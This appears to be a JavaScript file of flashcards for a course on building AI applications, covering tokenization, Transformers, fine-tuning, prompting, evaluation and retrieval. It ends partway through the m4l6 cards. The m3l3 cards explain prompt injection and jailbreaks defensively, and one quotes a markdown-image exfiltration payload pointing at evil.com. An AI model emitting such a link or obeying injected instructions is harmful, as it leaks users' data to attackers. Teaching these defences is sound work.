// Hand-authored spaced-repetition review cards for the AI Implementation
// Reference course, keyed by the legacy lesson id. ~3 cards per lesson, drawn
// from each lesson's key takeaways and core ideas. Merged into the course by
// scripts/convert-ai-reference.mjs (which assigns ids `${lessonId}-i${n}`).

export const CARDS = {
  "m1l1": [
    { "front": "At the lowest level, what is the \"intelligence\" in an AI model actually made of?", "back": "A very large set of adjustable numbers called *parameters* (or *weights*) inside a giant mathematical function, tuned to map inputs to likely outputs. It's math, not magic — no hand-coded rules or logic." },
    { "front": "What is the difference between *training* and *inference*?", "back": "Training is the expensive, one-time process of finding the model's weights via repeated error-correcting nudges. Inference is using the frozen weights to produce an output for a request — just arithmetic, with no learning happening." },
    { "front": "Why does a chatbot not remember your previous question unless you resend the conversation?", "back": "At inference time the weights are frozen and no learning occurs. The model only sees what's in its current input, so prior turns must be fed back in every time to be \"remembered\"." },
    { "front": "Why are hallucinations the system \"working as designed\" rather than a bug?", "back": "An LLM is optimized to generate *plausible* continuations, not *true* ones. A confident, well-formed, wrong answer is exactly what a plausibility-predictor produces — it was never optimizing for factual accuracy." },
    { "front": "When should you use traditional deterministic code instead of AI for a problem?", "back": "When the rules are clear, fixed, and auditable (e.g. tax brackets, form validation), or when you need the exact same answer every time. Code is cheaper, fully testable, and reproducible." },
    { "front": "What are the three forces that made the recent AI explosion possible?", "back": "Data (the internet produced massive training corpora), compute (GPUs plus cloud made large-scale parallel computation accessible), and algorithms (the 2017 Transformer enabled parallel sequence processing)." },
    { "front": "What do *scaling laws* claim, and what does *emergence* add to that picture?", "back": "Scaling laws say performance improves along a smooth, predictable curve as parameters, data, and compute grow together. Emergence is the surprise on top: some abilities are absent in small models and \"switch on\" only past a size threshold, without being programmed." }
  ],
  "m1l2": [
    { "front": "What single trade-off do you make as you move inward through AI → ML → Deep Learning → Generative AI?", "back": "Each inner layer requires *less human engineering* but *more data and compute* (and less interpretability), buying greater capability and generality at that cost." },
    { "front": "What defines *classic* machine learning, and why does it still dominate tabular data?", "back": "Humans design the features by hand; the algorithm just learns weights over them. It wins on structured/tabular data because the features are already columns — it's cheap, fast, interpretable, and gradient-boosted trees often beat neural nets there." },
    { "front": "What does \"deep\" mean in deep learning, and what does depth buy you?", "back": "\"Deep\" means many layers of simple math units stacked. Depth enables *hierarchical representation* — early layers learn primitive features (edges, words) and later layers combine them into higher concepts — learned automatically rather than hand-engineered." },
    { "front": "What is the core distinction between *discriminative* and *generative* models?", "back": "Discriminative models learn the boundary between categories (P(label | input)) — they classify and predict. Generative models learn the distribution of the data itself (P(input)), so they can sample brand-new examples like text or images." },
    { "front": "How did foundation models change the build workflow compared to classic ML?", "back": "Instead of collecting a labeled dataset and training a separate model per task, you take one pre-trained model and adapt it with a *prompt* — often zero extra training. The shift is from \"a model per task\" to \"one general model, many tasks via prompting\"." },
    { "front": "Is an LLM deep learning or generative AI?", "back": "Both. It's a deep neural network (a Transformer) that is also generative. The categories nest and overlap — something can be ML, DL, and GenAI simultaneously." },
    { "front": "For structured/tabular data with limited examples, why often choose gradient-boosted trees over deep learning?", "back": "They're cheaper, faster, and more interpretable, and they usually beat neural networks outright on tabular prediction. Pick the least powerful tool that solves the problem." }
  ],
  "m1l3": [
    { "front": "As an AI implementor, which layers of the three-layer stack do you actually work in, and which do you avoid?", "back": "You live in the platform layer (Azure AI, Bedrock, Vertex) and the tooling/application layer (orchestration, vector DBs, evals, products). You almost never build the model layer — you compose, ground, and deploy models rather than training them." },
    { "front": "Why is the AI market dominated by only a handful of frontier labs, each tied to a cloud giant?", "back": "A single state-of-the-art training run costs tens to hundreds of millions of dollars in compute and needs tens of thousands of high-end GPUs. Only well-capitalized, cloud-backed labs can afford the compute and data bottlenecks." },
    { "front": "What do you gain and give up by choosing an open-weight model over a closed API model?", "back": "Open-weight gives control, privacy, free fine-tuning, inspection, and the ability to pin a version forever — but you must run the GPUs and infrastructure, and the best open model typically trails the best closed model by 6–18 months." },
    { "front": "When does a closed frontier API beat self-hosting an open-weight model?", "back": "When you need the highest possible capability fast, or you're a small team with no MLOps or GPU expertise — the API delivers peak capability with zero infrastructure to manage." },
    { "front": "Why should you trust your own evaluation over a model's public benchmark scores?", "back": "Public benchmarks get contaminated (leaked answers), gamed (tuned to the metric), and saturated (top models cluster, so differences are noise), and they may not match your data. Use them only to build a shortlist, then run your own eval on representative data." },
    { "front": "What does it mean to \"stay model-agnostic,\" and why is it the practical hedge?", "back": "Build behind an abstraction layer (Semantic Kernel, LangChain, LiteLLM) so swapping providers is a config change, not a rewrite. The best model changes every few months and base models are commoditizing, so the durable value is your data, workflows, and evals — not the current model." },
    { "front": "On a model card, what is the *knowledge cutoff* and how do you work around it?", "back": "It's the date the model's training data ends; anything after that it doesn't know. You supply newer or proprietary information at runtime via retrieval (RAG) rather than relying on the model's memory." }
  ],
  "m2l1": [
    { "front": "Why can't an LLM reliably count the letters in a word like \"strawberry\" or do exact multi-digit arithmetic?", "back": "It never sees individual characters or digits — it sees subword *tokens* (e.g. \"straw\" + \"berry\"). Counting letters or doing place-value math means reasoning about something it can't directly observe." },
    { "front": "What is Byte Pair Encoding (BPE) and how does it build a vocabulary?", "back": "BPE is a tokenizer training algorithm: start from individual characters, repeatedly find the most frequent adjacent pair of symbols, and merge it into a new token, repeating thousands of times until a target vocab size. Common words become single tokens; rare words split into reusable pieces." },
    { "front": "Why did subword tokenization win over word-level and character-level approaches?", "back": "Word-level needs an impossibly huge vocabulary and can't handle new words; character-level makes sequences too long. Subword tokenization is the practical middle ground — common words are single tokens while any string can still fall back to characters." },
    { "front": "What is an embedding, and what does it mean geometrically?", "back": "An embedding is a dense vector (e.g. 1,536 numbers) representing meaning — a single point in high-dimensional space arranged so that direction and proximity encode meaning. Texts with similar meaning land near each other, enabling semantic search by finding nearest points." },
    { "front": "For text embeddings, which similarity metric should you use and why?", "back": "Use cosine similarity (or dot product on normalized vectors), because meaning lives in a vector's *direction*, not its magnitude. Mixing metrics or using dot product on un-normalized vectors silently corrupts ranking." },
    { "front": "Why can't you compare an embedding from one model against an embedding from a different model?", "back": "Embeddings from different models live in different, incompatible vector spaces. Switching embedding models means re-embedding (re-indexing) your entire corpus." }
  ],
  "m2l2": [
    { "front": "In self-attention, what roles do the Query, Key, and Value vectors play?", "back": "Query = what a token is looking for; Key = what a token offers to others; Value = the information it contributes. A token's attention to another is the dot product of its Query with the other's Key, and its output is a weighted blend of every token's Value." },
    { "front": "Why is attention scaled by 1/√(d_k) before the softmax?", "back": "In high dimensions, dot products grow large and push softmax into a near one-hot regime where gradients vanish and learning stalls. Dividing by √(d_k) keeps scores in a sane range — the \"scaled\" in scaled dot-product attention." },
    { "front": "What problem does positional encoding solve, and what do modern LLMs use?", "back": "Attention is permutation-invariant, so without it \"dog bites man\" and \"man bites dog\" look identical. Positional encoding injects order into token vectors; modern models use RoPE (rotary position embedding), which also bounds and shapes the context window." },
    { "front": "Where in a Transformer does most memorized knowledge live, and why does that matter?", "back": "In the feed-forward (FFN) layers, which hold ~2/3 of parameters and act like a key-value memory of facts. Attention moves information around; the FFN does recall. This is why facts are \"baked into the weights\" and why RAG exists to supply fresh facts at inference." },
    { "front": "Why does long context cost so much in both tokens and compute?", "back": "Self-attention compares every token with every other token, so cost grows with the *square* of sequence length (O(n²)) — double the context, quadruple the attention compute and memory. This is why retrieval is often smarter than stuffing everything into the prompt." },
    { "front": "Why are modern general-purpose LLMs (GPT, Claude, Llama) decoder-only rather than encoder-only?", "back": "Decoder-only models generate tokens left-to-right and have become the dominant design for text generation, chat, and code. Encoder-only (BERT-style) suits classification/embeddings/understanding; encoder-decoder suits strict input→output mapping like translation." }
  ],
  "m2l3": [
    { "front": "What are the three main stages that turn raw text into a production chat assistant, and what does each add?", "back": "Pre-training (learn language/world knowledge by next-token prediction → base model), supervised fine-tuning/SFT (follow instructions via curated prompt-answer pairs → instruct model), and preference optimization (RLHF/DPO) to align with human preferences → chat model." },
    { "front": "Why is a raw base model not usable as an assistant?", "back": "It's only trained to predict the next token, so it completes patterns rather than answering. Asked \"What is the capital of France?\" it might continue with more quiz questions. It rambles, refuses nothing, and ignores instructions until SFT teaches it to be a helpful respondent." },
    { "front": "How does LoRA fine-tune a model so cheaply?", "back": "The change fine-tuning makes to a weight matrix is usually low-rank, so LoRA freezes the original weights and learns only a small A·B \"delta\" — training millions of parameters instead of billions. The adapter is a few MB, hot-swappable, and less likely to wreck general ability." },
    { "front": "In RLHF, what is the KL penalty for during PPO optimization?", "back": "It keeps the model from drifting too far from the SFT model. Without it, the model learns to game the reward model and collapses into weird high-scoring gibberish instead of staying a coherent assistant." },
    { "front": "What does DPO (Direct Preference Optimization) do differently from classic RLHF?", "back": "DPO optimizes the model directly on preference pairs with a single stable supervised-style loss — no separate reward model and no reinforcement learning — reaching comparable alignment quality with far less complexity." },
    { "front": "Should you fine-tune or use RAG to give a model up-to-date or private facts?", "back": "Use RAG. Fine-tuning changes behavior (style, format, task) by adjusting weights but doesn't reliably teach facts — fine-tuned knowledge is frozen, costly to update, and recalled unreliably. Rule of thumb: fine-tune for form, retrieve for facts." }
  ],
  "m2l4": [
    { "front": "Why do output tokens cost 3–5x more than input tokens?", "back": "Input is processed in one parallel forward pass (prefill, GPU fully utilized, cheap per token). Output is generated one token at a time, each needing its own forward pass through the whole model (decode, GPU underutilized) — a serial loop, so providers price it higher." },
    { "front": "Why is prompt caching the single biggest cost lever, and how much does it save?", "back": "When the system prompt + static context is identical across requests, the provider reuses the precomputed KV vectors instead of recomputing them. Anthropic charges ~90% less on cached tokens (OpenAI ~50%), and it also cuts time-to-first-token." },
    { "front": "How should you structure a prompt to maximize cache hits?", "back": "Put the stable content first as a prefix — system prompt → tool definitions → static context → then variable user input. Caching works on a byte-for-byte identical prefix, so one changed character early (e.g. an injected timestamp) invalidates everything after it." },
    { "front": "What's the difference between model routing and a cascade?", "back": "Routing classifies the request up front and dispatches it to the cheapest capable model. A cascade answers with a cheap model first, checks a confidence/validation signal, and escalates to the expensive model only when the cheap answer fails." },
    { "front": "Why is model routing often a bigger cost lever than caching?", "back": "In a typical workload 50–80% of queries are \"easy.\" Routing those to a model 5–20x cheaper saves far more than caching, and the cost of the extra classifier call is trivial against the savings." },
    { "front": "Name two common patterns that make production LLM bills unexpectedly blow up.", "back": "Examples: unbounded agent loops that re-send growing history (10–50x a single call), no max_tokens set, re-sending full conversation history (quadratic growth), verbose reasoning on easy tasks, retries without backoff, and leaving caching off on a stable prefix." }
  ],
  "m2l5": [
    { "front": "What four factors trade off in model selection, and where should you start?", "back": "Quality, speed, cost, and control. Start with the cheapest model that might work, test it, and move up a tier only when you have evidence the cheaper model fails." },
    { "front": "What is the single highest-leverage step when running a model bake-off?", "back": "Building an eval set of 50–100 real, representative examples with known-good answers, including hard and weird cases. It outlives any single model and is reusable for routing, regression tests, and the next model release." },
    { "front": "Why should you trust your eval set over public leaderboards when choosing a model?", "back": "There's no single \"best model,\" only the best for your task. Benchmarks measure general ability; a \"weaker\" model can score higher on your specific data due to personality, schema-following, domain jargon, or prompt sensitivity. The model that wins your 100 examples is, by definition, better for you." },
    { "front": "When should you use a reasoning model instead of a standard model?", "back": "Only when your eval shows the task genuinely needs multi-step reasoning the standard model fails at. Reasoning models spend extra test-time compute (hidden chain-of-thought), making them 5–30x slower and far more expensive, and overkill for classification, extraction, or simple Q&A." },
    { "front": "Roughly where is the cost crossover that justifies self-hosting an open model over an API?", "back": "Well past ~500K–1M calls/day of high, steady volume — or for hard data-sovereignty needs or a fine-tuned model you must run yourself. Below that, the API's all-in cost is lower once you price in operational labor, not just GPU hours." },
    { "front": "Which latency metric most determines whether a chat UI *feels* responsive, and what hides the rest?", "back": "Time-to-first-token (TTFT), dominated by prefill and model size — it's how long until the user sees anything. Streaming the output hides everything after the first token. Always measure tail latency (p95/p99), not just the average." }
  ],
  "m2l6": [
    { "front": "What is the \"customization ladder\" and in what order should you climb it?", "back": "Prompt + few-shot → RAG → fine-tune → distill. Each rung costs more and is harder to reverse, so climb only as high as your eval forces you to. Most problems stop at rung 1 or 2; jumping straight to fine-tuning is the most common expensive mistake." },
    { "front": "What is distillation, and why is it the highest-leverage production customization pattern?", "back": "Use a strong, expensive teacher model to generate ideal outputs/labels, then fine-tune a small, cheap student on them. The student approaches teacher quality on that one narrow task at a fraction of per-call cost and latency — near-frontier quality at small-model prices." },
    { "front": "What precautions are essential when using synthetic data to fine-tune or evaluate a model?", "back": "Validate its quality (garbage in, garbage out), force diversity (models produce samey output), watch for inherited teacher errors/bias, never let synthetic data be your only eval (the held-out test set must contain real inputs), and check provider terms on training from outputs." },
    { "front": "When do small or on-device language models (SLMs, ~1B–14B params) win over a frontier model?", "back": "Privacy/data residency (data never leaves), low latency (no network round-trip), cost at high steady volume, and offline operation. For a narrow, distilled task their lower reasoning ceiling rarely matters — they can be indistinguishable from a frontier model on that job." },
    { "front": "Why is fine-tuning a poor way to inject what a model knows, even though it sounds powerful?", "back": "Facts baked into weights are frozen at training time, can't be cited, are expensive to update, and *increase* hallucination risk because the model can't tell what it half-memorized. Use RAG for facts; fine-tune only for behavior and form." },
    { "front": "What hidden costs and risks should you budget for before committing to a fine-tune?", "back": "Catastrophic forgetting (narrow tuning degrades general ability), data quality dominating over quantity, the need for a before/after eval on the same held-out set, treating the adapter as a versioned artifact to re-tune as base models deprecate, and data-labeling cost often exceeding GPU time." }
  ],
  "m3l1": [
    { "front": "Mechanically, what does a prompt do to an LLM — does it train or change the model?", "back": "No. A prompt is the *context* the model predicts the next token from; it *conditions* the probability distribution over what comes next without training the model or changing any weights. Prompt engineering is essentially distribution steering." },
    { "front": "Which two mechanisms from how LLMs work explain why prompting is powerful?", "back": "*Attention* (every generated token can attend to every prompt token, so early instructions influence late output) and *in-context learning* (large models infer a task from examples in the prompt with no training)." },
    { "front": "Why does giving a specific instruction (e.g. \"3-sentence summary for a technical audience\") work better than a vague one?", "back": "A vague prompt is consistent with millions of plausible continuations, so the model picks an average one. Specifics narrow the distribution so the likely continuations are the ones you actually want." },
    { "front": "Why do few-shot examples often outperform longer prose instructions for nailing a format?", "back": "Prose is lossy — the model must interpret your description, then produce the format. An example collapses both steps by showing the exact target, and in-context learning copies it, pinning down tone, structure, and edge cases more reliably." },
    { "front": "What is the practical difference between the system, user, and assistant roles in a chat prompt?", "back": "System holds durable, privileged instructions/persona/format that the model is trained to weight heavily; user carries the actual request and per-turn data; assistant is the model's replies (replayed as history in multi-turn). Keep instructions in system, data in user." },
    { "front": "What are primacy, recency, and \"lost in the middle,\" and how should they shape prompt layout?", "back": "Models attend strongly to the start (primacy) and to content just before generation (recency), and least to the middle of long contexts. So put instructions/format at the top, supporting context in the middle, and the specific task last." },
    { "front": "Why should you always fence user-supplied or retrieved content with delimiters?", "back": "It helps the model tell instructions from data, and it's the first defense against prompt injection where data tries to pose as instructions. The rule: never concatenate raw user input directly against your instructions." },
    { "front": "When should you reach for few-shot examples instead of a zero-shot instruction?", "back": "Start with zero-shot for simple, well-known tasks. Add 2–5 diverse examples in the target format when you need to nail a specific format, tone, or edge-case behavior that prose alone doesn't pin down." }
  ],
  "m3l2": [
    { "front": "Why does chain-of-thought improve performance, in terms of how a Transformer computes?", "back": "A Transformer does a fixed amount of compute per token. Reasoning tokens act as a scratchpad that buys serial compute — each step becomes context the next step attends to, so the model builds the result incrementally instead of guessing in one forward pass." },
    { "front": "When is chain-of-thought *not* worth using?", "back": "For lookups, classification, and extraction. CoT spends the priciest (output) tokens and adds latency, so it just burns money where no multi-step reasoning is needed." },
    { "front": "How does self-consistency improve on a single chain-of-thought, and why does it work?", "back": "It samples several reasoning chains at temperature > 0 and takes the majority answer. Wrong chains tend to err in different directions while correct chains converge, so voting lets the right answer win — at a cost linear in the number of samples." },
    { "front": "How should you prompt a reasoning model (o-series, extended thinking, R1) differently from a standard model?", "back": "Don't hand-roll chain-of-thought — telling it to \"think step by step\" is redundant and can degrade output by interfering with its trained internal reasoning. Just ask clearly, and use a reasoning-effort knob where available." },
    { "front": "What is the most reliable way to get typed, valid structured output, and why beat \"please return JSON\"?", "back": "Tool/function calling (or JSON mode with constrained decoding) forces syntactically valid output via the decoder, making malformed JSON impossible. \"Please return JSON\" works most of the time, and the failures crash downstream parsers exactly when it hurts." },
    { "front": "If you want both chain-of-thought reasoning and strict JSON, how do you resolve the tension?", "back": "Reasoning text and strict JSON fight each other, so let the model reason in a separate `scratchpad` field and put the structured answer in its own field — or do reasoning in one call and formatting in a second." },
    { "front": "Mechanically, what does the temperature parameter do to the model's output?", "back": "It divides the logits before the softmax. Low temperature (→0) sharpens the distribution toward the single most likely token (near-greedy, repeatable); high temperature (≈1+) flattens it, giving low-probability tokens a real chance for more diverse output." },
    { "front": "Is temperature 0 perfectly deterministic?", "back": "No. Floating-point effects and server-side batching can still cause occasional variation. True reproducibility also needs fixed seeds where supported, and even then providers don't always guarantee it." },
    { "front": "What is Tree of Thoughts, and why is it rare in production?", "back": "ToT treats reasoning as search — generate candidate next steps, evaluate them, expand promising ones, and backtrack from dead ends. It can multiply calls 10–100x and adds orchestration complexity, so reach for it only when a task truly has many viable paths and linear CoT keeps failing." }
  ],
  "m3l3": [
    { "front": "What is the root cause of prompt injection, and why can't it be fully solved like SQL injection?", "back": "Instructions and data travel in the same token channel with no hardware boundary marking trusted commands vs untrusted data. SQL injection is solved by parameterized queries that separate code from data; LLMs have no equivalent, so injection is mitigated, never eliminated." },
    { "front": "What is the difference between direct and indirect prompt injection, and why is the latter more dangerous?", "back": "Direct injection is adversarial input typed by the user. Indirect injection hides malicious instructions in content the model ingests later (a web page, a PDF in RAG, an email). It's worse because the victim is a legitimate user, it can target that user's data, and it scales by poisoning popular documents." },
    { "front": "How does a jailbreak differ from prompt injection, and whose responsibility is each?", "back": "Injection overrides the *developer's* instructions (your job: instruction design, filtering, least privilege). A jailbreak subverts the *model's own safety training* (largely the provider's job). For most enterprise apps injection is the bigger practical risk." },
    { "front": "Why is prompting alone insufficient for security, and what is the guiding principle of defense in depth?", "back": "Because injection can't be reliably prompted away, security comes from layers: prompt delimiters, input filtering, output validation, least privilege, human-in-the-loop, and monitoring. The principle: assume the prompt layer will eventually be breached and ensure that breach can't do real damage." },
    { "front": "Why must you validate model *output*, not just filter input?", "back": "Even a perfectly injected prompt can't bypass code that runs after the model. Validating structure/schema, allow-listing enums, scanning for leaks, and sanitizing rendered content enforce safety regardless of what the model was tricked into producing." },
    { "front": "How can a markdown image in model output exfiltrate data, and what does it imply?", "back": "An attacker gets the model to emit an image whose URL embeds stolen data (e.g. `![](https://evil.com/log?data=...)`), so merely rendering the answer leaks it. This is why you sanitize/strip links, HTML, and markdown images in output before display." },
    { "front": "Why should you never put secrets or credentials in a prompt?", "back": "Assume the prompt can be extracted via injection. System-prompt theft exposes business logic and guardrail wording, and any embedded credentials leak with it." },
    { "front": "How should injection/jailbreak risk be ranked across application surfaces?", "back": "By what the model can touch (data + tools), not how the UI looks. An internal read-only tool is low risk; a RAG over external docs is high (indirect injection); an agent with email/payment/DB-write tools or a multi-tenant app is critical." }
  ],
  "m3l4": [
    { "front": "Why is evaluation described as the core skill of AI engineering?", "back": "It's how you know whether your steering worked — turning \"this seems better\" into a number you trust. Without it you tune on vibes, which don't scale, don't survive a model upgrade, and can't be handed to a teammate." },
    { "front": "What is an eval set, and why is it called the most valuable artifact you build?", "back": "A curated collection of representative inputs each paired with an expected output or grading rubric. It's more durable than any prompt or model — both churn while a good eval set keeps paying off across every future change." },
    { "front": "What are the key practices for building an eval set that predicts production quality?", "back": "Mine real traffic instead of inventing examples, cover the head and the long tail (include every bug you've fixed as a regression suite), label the hard/ambiguous/should-refuse cases, start small and grow, and freeze a holdout you never tune against." },
    { "front": "What is the difference between offline and online evaluation, and why do you need both?", "back": "Offline runs the system against a frozen eval set in CI to gate releases — fast and repeatable but only covers cases you thought of. Online measures real traffic (A/B, canary, user feedback) to catch the distribution shift offline missed. The loop closes when online failures become new offline cases." },
    { "front": "What are the three families of eval metrics, and when do you use each?", "back": "Deterministic/structural (exact match, schema, regex) for constrained output — cheapest and perfectly reliable; reference-based similarity (BLEU/ROUGE/embedding) for translation/summarization; LLM-as-judge for open-ended quality where exact match is meaningless." },
    { "front": "If you can check an output with code, should you ever use an LLM to check it?", "back": "No. Whenever the output is constrained — classification labels, extracted fields, routing, valid JSON — use a deterministic check. It's cheap, instant, and perfectly reliable; an LLM judge there only adds cost and unreliability." },
    { "front": "What practices make LLM-as-judge reliable rather than confidently wrong?", "back": "Validate it against human ratings first, use a separate strong judge model (not the same model under test), know its biases (length, position, self-preference), prefer pairwise over absolute scoring, and always capture the reason behind a score." },
    { "front": "What are the known biases of an LLM judge, and how do you counter them?", "back": "It favors longer and more confident answers, shows position bias (first option wins too often — randomize order), and self-preference (rates its own family higher — use a different judge). Prefer pairwise comparisons over absolute 1–10 scales, which drift." },
    { "front": "When is human evaluation necessary despite being slow and expensive?", "back": "Three situations: bootstrapping a rubric (you can't automate a bar you haven't defined), validating that an LLM judge agrees with people, and grading high-stakes outputs. Spend it where it has leverage — calibrating the cheap automated metrics you'll run thousands of times." },
    { "front": "What are the five steps of eval-driven development?", "back": "1) Observe a failure; 2) add it to the eval set as a permanent labeled case; 3) change exactly one thing; 4) re-run the whole set to confirm the fix and no regressions; 5) ship only if the score rose with no regressions, else revert. This makes quality ratchet upward instead of whack-a-mole." }
  ],
  "m3l5": [
    { "front": "What four structural parts does every prompt template in the cookbook share?", "back": "1) Role + objective in the system block; 2) explicit rules including edge-case handling and an uncertainty fallback; 3) an exact output format/schema; 4) delimited input fencing untrusted data off from instructions." },
    { "front": "Beyond filling in the bracketed parts, what two steps are critical before shipping a prompt template?", "back": "Don't ship on vibes — run it against a 20–100 example eval set. And where the output feeds code, *enforce* the schema with JSON mode or tool calling rather than trusting the prompt alone." },
    { "front": "What is the single most-skipped yet most-important rule to include in a template's instructions?", "back": "A fallback for uncertainty — telling the model exactly what to do or return when it can't answer confidently (e.g. an escalate status or \"I don't have that information\")." },
    { "front": "In an extraction prompt, why instruct the model to use null for missing fields and never guess?", "back": "To prevent hallucinated/inferred data — the model should extract only information explicitly stated. Guessed values silently corrupt downstream data, so unfound fields become null and ambiguous ones get low confidence." },
    { "front": "Why does the triage template separate a `scratchpad` reasoning field from the `severity`/`route` decision fields?", "back": "Reasoning text and strict structure fight each other. Keeping free-text reasoning in its own field lets the model reason before answering while the decision fields stay clean and machine-parseable." },
    { "front": "In the query-rewriting template for RAG, why must each rewritten query be standalone?", "back": "The query is searched without the conversation history, so pronouns and references must be resolved into a self-contained query; otherwise retrieval can't interpret it. Synonyms/alternate phrasings are also added to match how docs are worded." }
  ],
  "m4l1": [
    { "front": "In the \"open-book exam\" mental model of RAG, what role does retrieval play, and what does this predict about most RAG failures?", "back": "Retrieval is the act of choosing which pages (chunks) to put on the desk for the model to read. This predicts that most RAG failures are *page-selection* (retrieval) failures, not the model being insufficiently smart." },
    { "front": "Why should you use the *same* embedding model for ingestion and for query time in a RAG system?", "back": "Vectors produced by different embedding models aren't comparable, so a mismatch silently destroys retrieval quality. You can re-index the whole corpus without touching serving code, but both phases must embed with the identical model." },
    { "front": "What does \"retrieval caps generation\" mean, and where should you spend effort when RAG answers are poor?", "back": "The generator can only be as good as what retrieval feeds it — if the relevant chunk isn't in the context, no model intelligence or prompt tuning can recover the answer. Fix retrieval recall/precision first; reach for a bigger LLM last." },
    { "front": "When is RAG the right tool versus fine-tuning, a long-context prompt, or just the system prompt?", "back": "Use RAG for large, changing, or private knowledge that must be answered accurately and cited. Fine-tune to change behavior/style, put small static facts in the system prompt, and consider long-context only when the whole corpus fits cheaply." },
    { "front": "Why is grounding in RAG described as \"encouraged, not guaranteed\"?", "back": "Even with good context, the model can ignore it, blend in stale prior knowledge, or hallucinate. Faithfulness must therefore be measured, not assumed." }
  ],
  "m4l2": [
    { "front": "Mechanically, why does an overly large chunk hurt retrieval quality?", "back": "Each chunk is compressed into a single fixed-size vector. A large chunk spanning many topics produces a vector that's the average of all of them — \"blurry\" meaning that matches everything weakly and nothing strongly, while also wasting context tokens." },
    { "front": "What problem does chunk overlap solve, and what is a typical amount?", "back": "Overlap prevents a fact from being lost when it straddles a chunk boundary (e.g., \"the warranty lasts | 24 months\"). Rule of thumb: overlap ≈ 10–20% of chunk size, e.g. ~50 tokens on 500-token chunks." },
    { "front": "How does parent-child (small-to-big) retrieval resolve the small-vs-large chunk dilemma?", "back": "It decouples what you embed from what you return: embed and search over small *child* chunks for precise matching, but when a child hits, hand the larger *parent* chunk to the LLM for full context. You get retrieval precision and generation context." },
    { "front": "What is contextual retrieval, and why does it improve matching?", "back": "Before embedding, prepend a short LLM-generated summary situating the chunk in its document (e.g. \"From the 2025 Travel Policy, Reimbursement section\"). The otherwise-ambiguous chunk now carries its own context, so it embeds and matches far more accurately, at a small one-time ingestion cost." },
    { "front": "Why is splitting on document structure usually better than splitting on a fixed character count?", "back": "A fixed-size cut slices through sentences, table rows, or functions, producing chunks that embed poorly. Boundaries placed where a human sees a natural break (paragraphs, headings, function/class limits) align with coherent ideas and improve retrieval more than tuning the exact token count." }
  ],
  "m4l3": [
    { "front": "Why do vector databases use Approximate Nearest Neighbor (ANN) search instead of exact k-NN?", "back": "Exact k-NN compares the query against every stored vector (O(N)), which is hopeless at millions of vectors. ANN trades a sliver of accuracy for orders-of-magnitude speed, returning *almost certainly* the top-K in milliseconds — making recall@k a tunable that never quite hits 100%." },
    { "front": "In HNSW, what does the efSearch parameter control, and why does it matter operationally?", "back": "efSearch is the number of candidates explored at query time — the main recall-vs-latency knob you tune live. Higher efSearch finds more true neighbors (better recall) but slows each query." },
    { "front": "Why does production RAG combine vector search with BM25 keyword search?", "back": "They have complementary failure modes: semantic vector search misses exact tokens (codes like ERR_4012, IDs, names), while lexical BM25 misses synonyms (\"feline\" vs \"cat\"). Hybrid covers both, typically yielding 10–30% better retrieval than vector-only." },
    { "front": "How does Reciprocal Rank Fusion (RRF) merge vector and keyword results, and why is that approach preferred?", "back": "RRF fuses on rank, not score: each doc's fused score is the sum over all lists of 1/(k+rank). Because it uses only ranks, it needs no score normalization (cosine and BM25 scores aren't comparable) and no tuning — so nearly every hybrid engine uses it." },
    { "front": "Why prefer pre-filtering over post-filtering by metadata, especially in a multi-tenant app?", "back": "Pre-filtering restricts the candidate set by metadata before the ANN search, so it's more accurate and won't return fewer than K results. It's also the basis of security: pre-filtering by tenant_id is what stops one customer's query from ever matching another's data." },
    { "front": "Why shouldn't you treat a similarity score like 0.82 as \"82% relevant\" or use raw score thresholds?", "back": "Similarity scores aren't probabilities. Use them for ranking, not as calibrated relevance, and gate quality with reranking and evals rather than raw thresholds." }
  ],
  "m4l4": [
    { "front": "What is the \"query-document gap,\" and which RAG techniques are designed to close it?", "back": "A question (short, interrogative, vague) is phrased nothing like the document that answers it (long, declarative, formal), so their vectors sit far apart and recall suffers. Query expansion, HyDE, and step-back prompting each close this gap, at the cost of one extra LLM call." },
    { "front": "How does HyDE work, and why does it help even though the generated answer is often factually wrong?", "back": "HyDE has the LLM write a hypothetical answer, embeds *that* (not the question), and searches with it. Correctness doesn't matter — *shape* does: a made-up answer is document-shaped, so its embedding lands near the real answer documents, which are then retrieved (the draft is discarded)." },
    { "front": "What is the difference between a bi-encoder and a cross-encoder, and why does retrieval use one but reranking the other?", "back": "A bi-encoder encodes query and document separately into vectors that can be precomputed — fast at scale but loses subtle interaction. A cross-encoder feeds query and document together for a single relevance score — far more accurate but must run per candidate. So you retrieve broadly with the cheap bi-encoder, then rerank a few candidates with the cross-encoder." },
    { "front": "What is the typical retrieve-then-rerank pipeline, and why is a reranker often the highest-ROI upgrade to a mediocre RAG system?", "back": "Retrieve ~20–100 candidates broadly with the bi-encoder, then use a cross-encoder reranker to precisely re-order them down to the top 5 sent to the LLM. It gives breadth plus precision and directly fixes the common \"right docs retrieved but ranked poorly\" problem." },
    { "front": "What is the disciplined order for adding RAG patterns, and why not stack them all?", "back": "First nail the basics (clean parsing, good chunking, hybrid + reranker — the 80/20); add query transformation only if evals show a query-document gap; go agentic only for genuinely multi-step/multi-source tasks. Each pattern adds latency, cost, and failure surface, so let evals pick the one gap to close — more machinery is not more accuracy." }
  ],
  "m4l5": [
    { "front": "Which two sections of a RAG production checklist deserve the most attention, and why?", "back": "Ingestion and Retrieval, because most RAG quality problems are retrieval problems. Getting documents in cleanly and finding the right chunks matters more than generation tuning." },
    { "front": "What are the four non-negotiable items before putting a RAG system in front of users?", "back": "(1) A green eval set of 50+ representative pairs with a baseline; (2) enforced and tested grounding, including reliable \"I don't know\"; (3) traceability via citations and logged retrieved context; (4) correct access control via per-user/per-tenant metadata pre-filtering." },
    { "front": "Why is per-user/per-tenant access control treated as a ship-blocker rather than a quality improvement in RAG?", "back": "A RAG system that retrieves documents across users is a data breach, not just a bug. Retrieval must respect permissions via metadata pre-filtering before go-live." }
  ],
  "m4l6": [
    { "front": "Why must you measure RAG retrieval quality and generation quality separately?", "back": "A single end-to-end score can't localize failure. Measuring stages separately tells you whether the problem is retrieval (low context relevance) or generation (low faithfulness despite good context) so you fix the right thing." },
    { "front": "How are Precision@K and Recall@K defined for RAG retrieval?", "back": "Precision@K = relevant retrieved ÷ K (\"how clean is what I returned?\"). Recall@K = relevant retrieved ÷ total relevant chunks that exist (\"how much of what exists did I find?\")." },
    { "front": "Why is recall often prioritized over precision in RAG retrieval, and how is precision recovered?", "back": "A missed relevant chunk usually means a wrong or \"I don't know\" answer, so recall is the priority. The recipe is to retrieve at high K for recall, then rerank down to low K to recover precision before generation." },
